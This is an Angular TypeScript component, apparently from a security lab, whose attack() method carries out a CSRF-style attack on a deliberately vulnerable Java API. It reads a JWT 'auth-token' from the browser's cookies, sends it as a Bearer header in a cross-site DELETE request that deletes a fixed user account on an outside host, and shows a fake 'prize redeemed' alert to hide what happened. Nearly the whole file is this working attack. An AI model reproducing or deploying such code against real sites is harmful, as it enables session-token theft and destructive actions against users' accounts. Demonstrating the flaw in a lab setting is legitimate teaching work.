import { Component } from '@angular/core';
import { HttpClient, HttpHeaders } from '@angular/common/http';

@Component({
  selector: 'app-attack',
  templateUrl: './attack.component.html',
  styleUrls: ['./attack.component.css']
})
export class AttackComponent {
  constructor(private http: HttpClient) {}

  attack() {
    // Busca o token JWT armazenado no cookie vulnerável
    const token = document.cookie
      .split('; ')
      .find(row => row.startsWith('auth-token='))
      ?.split('=')[1];
  
    if (token) {
      const headers = new HttpHeaders().set('Authorization', `Bearer ${token}`);
  
      this.http.delete('https://java-vuln-api.onrender.com/auth/deluser/d6591f66-a608-4dce-a4f6-a09c392a1ed3', {
        headers,
        withCredentials: true  // Garante o envio do cookie em requisições cross-site
      }).subscribe({
        next: () => alert('Prêmio resgatado com sucesso!'),
        error: (err) => console.error('Erro no ataque CSRF:', err)
      });
    } else {
      console.error('Token JWT não encontrado nos cookies.');
    }
  }  
}